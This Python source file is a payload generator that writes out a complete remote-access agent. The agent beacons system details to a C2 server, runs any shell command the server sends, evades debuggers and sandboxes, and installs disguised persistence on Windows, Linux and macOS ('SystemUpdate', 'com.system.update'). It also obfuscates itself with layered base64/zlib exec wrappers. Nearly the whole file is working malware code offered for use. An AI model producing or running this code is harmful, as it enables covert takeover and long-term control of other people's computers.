#!/usr/bin/env python3
"""
Advanced Payload Generator with C2 Protocol Integration
REAL implementation that creates working agents
"""

import os
import sys
import base64
import zlib
import random
import string
import hashlib
import json
from typing import Optional, Dict, Any
from datetime import datetime

from Core.config_loader import config
from Core.logger import get_logger
from Core.c2_protocol_spec import C2Protocol, MessageType

log = get_logger('payload')

class AdvancedPayloadGenerator:
    """
    Generates working payloads that use the C2 protocol
    Includes persistence, anti-analysis, and proper communication
    """
    
    def __init__(self):
        self.templates_dir = config.get('payload.templates_dir', '/workspace/templates/')
        self.output_dir = config.get('payload.output_dir', '/workspace/generated/')
        self.obfuscation_level = config.get('payload.obfuscation_level', 3)
        
        # Ensure directories exist
        os.makedirs(self.templates_dir, exist_ok=True)
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Get C2 configuration
        self.c2_host = config.c2_host
        self.c2_port = config.c2_port
        self.auth_token = config.get('c2.auth_token', 'CHANGE_THIS_SECRET_TOKEN')
        self.beacon_interval = config.beacon_interval
        self.beacon_jitter = config.beacon_jitter
        
        log.info("Advanced payload generator initialized")
    
    def generate_agent(self, platform: str = 'python', 
                       persistence: bool = True,
                       anti_analysis: bool = True,
                       custom_config: Dict = None) -> str:
        """
        Generate a complete agent payload
        
        Args:
            platform: Target platform (python, windows, linux, macos)
            persistence: Include persistence mechanisms
            anti_analysis: Include anti-analysis techniques
            custom_config: Custom configuration overrides
            
        Returns:
            Generated payload code
        """
        
        if platform == 'python':
            return self._generate_python_agent(persistence, anti_analysis, custom_config)
        elif platform == 'windows':
            return self._generate_windows_agent(persistence, anti_analysis, custom_config)
        elif platform == 'linux':
            return self._generate_linux_agent(persistence, anti_analysis, custom_config)
        else:
            raise ValueError(f"Unsupported platform: {platform}")
    
    def _generate_python_agent(self, persistence: bool, anti_analysis: bool, 
                               custom_config: Dict) -> str:
        """Generate Python cross-platform agent"""
        
        # Merge configurations
        agent_config = {
            'c2_host': self.c2_host,
            'c2_port': self.c2_port,
            'auth_token': self.auth_token,
            'beacon_interval': self.beacon_interval,
            'beacon_jitter': self.beacon_jitter
        }
        if custom_config:
            agent_config.update(custom_config)
        
        # Generate unique agent ID components
        agent_id_seed = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        # Build the agent code
        agent_code = f'''#!/usr/bin/env python3
# Elite Agent - Generated {datetime.now().isoformat()}

import socket
import ssl
import json
import time
import os
import sys
import platform
import subprocess
import threading
import queue
import base64
import hashlib
import hmac
import zlib
import struct
import random
from pathlib import Path

# Configuration
CONFIG = {json.dumps(agent_config, indent=4)}

# Agent identification
AGENT_ID_SEED = "{agent_id_seed}"

class C2Protocol:
    """Embedded C2 protocol handler"""
    
    def __init__(self, auth_token):
        self.auth_token = auth_token
        self.shared_key = hashlib.sha256(auth_token.encode()).digest()
        self.enc_key = hashlib.sha256(self.shared_key + b'encryption').digest()[:32]
        self.hmac_key = hashlib.sha256(self.shared_key + b'authentication').digest()
        self.message_counter = 0
    
    def create_message(self, msg_type, payload, compress=True):
        """Create protocol message"""
        
        # Serialize payload
        payload_bytes = json.dumps(payload).encode('utf-8')
        
        # Compress if beneficial
        flags = 0
        if compress and len(payload_bytes) > 100:
            compressed = zlib.compress(payload_bytes, 9)
            if len(compressed) < len(payload_bytes):
                payload_bytes = compressed
                flags |= 0x01
        
        # Simple XOR encryption (simplified from AES for portability)
        encrypted = self._xor_encrypt(payload_bytes)
        flags |= 0x02
        
        # Message ID
        self.message_counter += 1
        msg_id = self.message_counter % 65536
        
        # Build header
        header = struct.pack('>IBBH',
            len(encrypted) + 8 + 32,  # Total length
            msg_type,  # Message type
            flags,  # Flags
            msg_id  # Message ID
        )
        
        # Combine and add HMAC
        message = header + encrypted
        hmac_value = hmac.new(self.hmac_key, message, hashlib.sha256).digest()
        
        return message + hmac_value
    
    def parse_message(self, data):
        """Parse protocol message"""
        
        if len(data) < 40:
            return None, None
        
        # Verify HMAC
        message = data[:-32]
        provided_hmac = data[-32:]
        expected_hmac = hmac.new(self.hmac_key, message, hashlib.sha256).digest()
        
        if provided_hmac != expected_hmac:
            return None, None
        
        # Parse header
        length, type_byte, flags, msg_id = struct.unpack('>IBBH', message[:8])
        
        # Extract and decrypt payload
        payload_bytes = message[8:]
        
        if flags & 0x02:
            payload_bytes = self._xor_encrypt(payload_bytes)  # XOR is reversible
        
        if flags & 0x01:
            payload_bytes = zlib.decompress(payload_bytes)
        
        try:
            payload = json.loads(payload_bytes.decode('utf-8'))
            return type_byte, payload
        except:
            return None, None
    
    def _xor_encrypt(self, data):
        """Simple XOR encryption"""
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ self.enc_key[i % len(self.enc_key)])
        return bytes(result)

class EliteAgent:
    """Main agent class"""
    
    def __init__(self):
        self.config = CONFIG
        self.protocol = C2Protocol(self.config['auth_token'])
        self.running = True
        self.socket = None
        self.command_queue = queue.Queue()
        self.agent_id = self._generate_agent_id()
        
        # System information
        self.system_info = self._gather_system_info()
    
    def _generate_agent_id(self):
        """Generate unique agent ID"""
        unique = f"{{platform.node()}}{{os.getlogin()}}{{AGENT_ID_SEED}}"
        return hashlib.md5(unique.encode()).hexdigest()[:12]
    
    def _gather_system_info(self):
        """Gather system information"""
        try:
            return {{
                'agent_id': self.agent_id,
                'hostname': platform.node(),
                'username': os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown'),
                'platform': platform.platform(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'python_version': sys.version,
                'cwd': os.getcwd(),
                'privileges': 'admin' if os.getuid() == 0 else 'user' if hasattr(os, 'getuid') else 'unknown'
            }}
        except:
            return {{'agent_id': self.agent_id, 'hostname': 'unknown'}}
    
    def connect(self):
        """Connect to C2 server"""
        while self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                # Use SSL if available
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    self.socket = context.wrap_socket(self.socket)
                except:
                    pass  # Continue without SSL
                
                self.socket.connect((self.config['c2_host'], self.config['c2_port']))
                return True
                
            except Exception as e:
                time.sleep(10)
                continue
        
        return False
    
    def send_message(self, msg_type, payload):
        """Send message to C2"""
        try:
            message = self.protocol.create_message(msg_type, payload)
            self.socket.send(message)
            return True
        except:
            return False
    
    def receive_message(self):
        """Receive message from C2"""
        try:
            # Read length prefix
            length_data = self.socket.recv(4)
            if not length_data:
                return None, None
            
            length = struct.unpack('>I', length_data)[0]
            
            # Read full message
            data = length_data
            while len(data) < length:
                chunk = self.socket.recv(min(4096, length - len(data)))
                if not chunk:
                    return None, None
                data += chunk
            
            return self.protocol.parse_message(data)
            
        except:
            return None, None
    
    def beacon(self):
        """Send initial beacon"""
        
        # Add authentication
        auth_data = f"{{self.system_info.get('hostname', '')}}{{self.system_info.get('username', '')}}"
        self.system_info['auth'] = hmac.new(
            self.config['auth_token'].encode(),
            auth_data.encode(),
            hashlib.sha256
        ).hexdigest()
        
        return self.send_message(0x01, self.system_info)  # BEACON = 0x01
    
    def heartbeat(self):
        """Send heartbeat"""
        payload = {{
            'agent_id': self.agent_id,
            'timestamp': time.time()
        }}
        return self.send_message(0x02, payload)  # HEARTBEAT = 0x02
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            if command.startswith('cd '):
                # Handle directory change
                path = command[3:].strip()
                os.chdir(path)
                return f"Changed directory to {{os.getcwd()}}", "", 0
            else:
                # Execute command
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                return result.stdout, result.stderr, result.returncode
                
        except subprocess.TimeoutExpired:
            return "", "Command timed out", -1
        except Exception as e:
            return "", str(e), -1
    
    def handle_command(self, command_data):
        """Handle command from C2"""
        command_id = command_data.get('command_id')
        command = command_data.get('command')
        
        if not command:
            return
        
        # Execute command
        start_time = time.time()
        stdout, stderr, exit_code = self.execute_command(command)
        execution_time = time.time() - start_time
        
        # Send result
        result_payload = {{
            'command_id': command_id,
            'output': stdout[:50000],  # Limit output size
            'error': stderr[:10000],
            'exit_code': exit_code,
            'execution_time': execution_time
        }}
        
        self.send_message(0x03, result_payload)  # RESULT = 0x03
    
    def communication_loop(self):
        """Main communication loop"""
        
        last_heartbeat = 0
        
        while self.running:
            try:
                current_time = time.time()
                
                # Send heartbeat if needed
                if current_time - last_heartbeat > self.config['beacon_interval']:
                    self.heartbeat()
                    last_heartbeat = current_time
                    
                    # Add jitter
                    time.sleep(random.randint(0, self.config['beacon_jitter']))
                
                # Check for commands
                self.send_message(0x07, {{'agent_id': self.agent_id}})  # REQUEST_COMMAND = 0x07
                
                # Receive response
                msg_type, payload = self.receive_message()
                
                if msg_type == 0x10:  # COMMAND
                    self.handle_command(payload)
                elif msg_type == 0x13:  # TERMINATE
                    self.running = False
                    break
                elif msg_type == 0x14:  # SLEEP
                    time.sleep(payload.get('duration', 60))
                
                # Small delay to avoid spinning
                time.sleep(1)
                
            except Exception as e:
                # Connection lost, reconnect
                self.socket.close()
                time.sleep(10)
                if not self.connect():
                    break
                self.beacon()
    
    def run(self):
        """Main agent entry point"""
        
        # Connect to C2
        if not self.connect():
            return
        
        # Send initial beacon
        if not self.beacon():
            return
        
        # Start communication loop
        self.communication_loop()
        
        # Cleanup
        try:
            self.socket.close()
        except:
            pass

'''
        
        # Add anti-analysis if requested
        if anti_analysis:
            anti_analysis_code = '''
# Anti-analysis checks
def check_debugger():
    """Check for debugger presence"""
    if sys.gettrace() is not None:
        sys.exit(1)
    
    try:
        import psutil
        current_process = psutil.Process()
        if current_process.parent().name() in ['gdb', 'lldb', 'x64dbg', 'windbg']:
            sys.exit(1)
    except:
        pass

def check_sandbox():
    """Check for sandbox environment"""
    
    # Check for VM artifacts
    vm_files = [
        '/sys/class/dmi/id/product_name',  # Linux
        'C:\\\\windows\\\\system32\\\\drivers\\\\vmmouse.sys',  # VMware
        'C:\\\\windows\\\\system32\\\\drivers\\\\vmhgfs.sys',  # VMware
    ]
    
    for vm_file in vm_files:
        if os.path.exists(vm_file):
            # Read file content for Linux
            if vm_file.startswith('/sys'):
                try:
                    with open(vm_file, 'r') as f:
                        content = f.read().lower()
                        if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'xen']):
                            time.sleep(random.randint(60, 300))  # Sleep instead of exit
                except:
                    pass

# Run anti-analysis checks
check_debugger()
check_sandbox()

'''
            agent_code += anti_analysis_code
        
        # Add persistence if requested
        if persistence:
            persistence_code = '''
def install_persistence():
    """Install persistence mechanism"""
    
    try:
        if sys.platform == 'win32':
            # Windows persistence via registry
            import winreg
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
            winreg.CloseKey(key)
        
        elif sys.platform.startswith('linux'):
            # Linux persistence via crontab
            import pwd
            home = pwd.getpwuid(os.getuid()).pw_dir
            
            # Create autostart desktop file
            autostart_dir = os.path.join(home, '.config', 'autostart')
            os.makedirs(autostart_dir, exist_ok=True)
            
            desktop_file = os.path.join(autostart_dir, 'system-update.desktop')
            with open(desktop_file, 'w') as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=System Update
Exec={sys.executable} {os.path.abspath(__file__)}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
""")
            
            # Also add to crontab
            os.system(f'(crontab -l 2>/dev/null; echo "@reboot {sys.executable} {os.path.abspath(__file__)}") | crontab -')
        
        elif sys.platform == 'darwin':
            # macOS persistence via LaunchAgent
            import pwd
            home = pwd.getpwuid(os.getuid()).pw_dir
            
            plist_path = os.path.join(home, 'Library', 'LaunchAgents', 'com.system.update.plist')
            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
            
            with open(plist_path, 'w') as f:
                f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>""")
            
            os.system(f'launchctl load {plist_path} 2>/dev/null')
    
    except:
        pass  # Silently fail if persistence fails

# Install persistence
install_persistence()

'''
            agent_code += persistence_code
        
        # Add main execution
        agent_code += '''
# Main execution
if __name__ == "__main__":
    try:
        agent = EliteAgent()
        agent.run()
    except KeyboardInterrupt:
        pass
    except:
        # Silent exit on error
        pass
'''
        
        # Apply obfuscation
        if self.obfuscation_level > 0:
            agent_code = self._obfuscate_code(agent_code)
        
        return agent_code
    
    def _generate_windows_agent(self, persistence: bool, anti_analysis: bool, 
                                custom_config: Dict) -> str:
        """Generate Windows-specific agent"""
        
        # For now, return Python agent that works on Windows
        # In production, this would generate native Windows executable
        return self._generate_python_agent(persistence, anti_analysis, custom_config)
    
    def _generate_linux_agent(self, persistence: bool, anti_analysis: bool,
                              custom_config: Dict) -> str:
        """Generate Linux-specific agent"""
        
        # For now, return Python agent that works on Linux
        # In production, this would generate ELF binary
        return self._generate_python_agent(persistence, anti_analysis, custom_config)
    
    def _obfuscate_code(self, code: str) -> str:
        """Apply obfuscation to code"""
        
        if self.obfuscation_level == 1:
            # Basic obfuscation - just encode
            encoded = base64.b64encode(code.encode()).decode()
            return f'import base64;exec(base64.b64decode("{encoded}"))'
        
        elif self.obfuscation_level == 2:
            # Medium obfuscation - compress and encode
            compressed = zlib.compress(code.encode(), 9)
            encoded = base64.b64encode(compressed).decode()
            return f'import base64,zlib;exec(zlib.decompress(base64.b64decode("{encoded}")))'
        
        elif self.obfuscation_level >= 3:
            # High obfuscation - multiple layers
            # Layer 1: Variable renaming
            import re
            
            # Generate random names
            replacements = {}
            for var in ['CONFIG', 'AGENT_ID_SEED', 'EliteAgent', 'C2Protocol']:
                replacements[var] = ''.join(random.choices(string.ascii_letters, k=8))
            
            for old, new in replacements.items():
                code = re.sub(r'\b' + old + r'\b', new, code)
            
            # Layer 2: Compress and encode
            compressed = zlib.compress(code.encode(), 9)
            encoded = base64.b64encode(compressed).decode()
            
            # Layer 3: Add decoder stub with junk
            junk = ''.join(random.choices(string.ascii_letters, k=random.randint(10, 20)))
            
            return f'''import base64,zlib
{junk}=None
exec(zlib.decompress(base64.b64decode("{encoded}")))
'''
        
        return code
    
    def save_payload(self, code: str, filename: str = None) -> str:
        """Save payload to file"""
        
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"agent_{timestamp}.py"
        
        filepath = os.path.join(self.output_dir, filename)
        
        with open(filepath, 'w') as f:
            f.write(code)
        
        # Make executable on Unix
        if sys.platform != 'win32':
            os.chmod(filepath, 0o755)
        
        log.info(f"Payload saved to {filepath}")
        return filepath

# Test the generator
if __name__ == "__main__":
    import sys
    sys.path.insert(0, '/workspace')
    
    print("Testing Advanced Payload Generator")
    print("-" * 50)
    
    generator = AdvancedPayloadGenerator()
    
    # Generate basic agent
    print("Generating basic agent...")
    basic_agent = generator.generate_agent(platform='python', 
                                          persistence=False, 
                                          anti_analysis=False)
    
    print(f"✅ Generated basic agent: {len(basic_agent)} bytes")
    
    # Verify it compiles
    try:
        compile(basic_agent, '<string>', 'exec')
        print("✅ Agent code compiles successfully")
    except SyntaxError as e:
        print(f"❌ Syntax error: {e}")
    
    # Generate advanced agent
    print("\nGenerating advanced agent with persistence and anti-analysis...")
    advanced_agent = generator.generate_agent(platform='python',
                                             persistence=True,
                                             anti_analysis=True)
    
    print(f"✅ Generated advanced agent: {len(advanced_agent)} bytes")
    
    # Save payload
    filepath = generator.save_payload(basic_agent, "test_agent.py")
    print(f"✅ Saved to {filepath}")
    
    print("\n✅ Payload generator working correctly!")